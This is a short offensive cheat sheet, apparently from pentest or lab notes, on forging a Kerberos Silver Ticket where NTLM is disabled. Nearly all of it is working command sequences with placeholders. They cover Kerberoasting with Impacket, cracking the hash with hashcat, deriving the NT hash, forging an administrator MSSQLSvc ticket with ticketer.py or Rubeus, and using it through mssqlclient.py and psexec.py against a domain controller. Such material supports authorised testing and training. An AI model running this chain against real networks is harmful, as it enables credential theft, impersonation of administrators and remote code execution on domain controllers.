# Silver Ticket (Kerberos-Only / NTLM Disabled)

When NTLM is disabled on a target, many Impacket tools fail unless you add `-k` and configure `/etc/krb5.conf`. A Silver Ticket forges a TGS for a specific service using only the service account's password hash — no DC contact needed.

**Prerequisites:** service account NT hash + domain SID + SPN

**Get Kerberoast hash with Kerberos-only (no NTLM):**
```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-host <DC_FQDN> -request -k
# -k forces Kerberos auth; must have /etc/krb5.conf entry for the domain
```

**Crack the hash, then derive NT hash:**
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
# or if you have the plaintext:
python3 -c "import hashlib; print(hashlib.new('md4', '<PASSWORD>'.encode('utf-16le')).hexdigest())"
```

**Forge Silver Ticket (Impacket):**
```bash
ticketer.py -nthash <SVC_NTHASH> -domain-sid <SID> -domain <DOMAIN> \
  -dc-ip <DC_IP> -spn MSSQLSvc/<DC_FQDN>:1433 administrator
# Produces: administrator.ccache
```

**Use the ticket:**
```bash
KRB5CCNAME=administrator.ccache mssqlclient.py -k <DC_FQDN>
KRB5CCNAME=administrator.ccache psexec.py -k <DOMAIN>/administrator@<DC_FQDN>
```

**Verify ticket:**
```bash
KRB5CCNAME=administrator.ccache klist
```

**/etc/krb5.conf entry required:**
```ini
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_kdc = false
[realms]
    DOMAIN.LOCAL = { kdc = dc.domain.local }
[domain_realm]
    .domain.local = DOMAIN.LOCAL
```

**Windows (Rubeus):**
```powershell
# Hash the plaintext password first:
Rubeus.exe hash /password:<SVCPASS>
# rc4_hmac value → use below

Rubeus.exe silver /domain:<DOMAIN> /dc:<DC_FQDN> /sid:<DOMAIN_SID> `
  /rc4:<RC4_HASH> /user:administrator /service:MSSQLSvc/<DC_FQDN>:1433 /ptt
klist   # verify injection
```
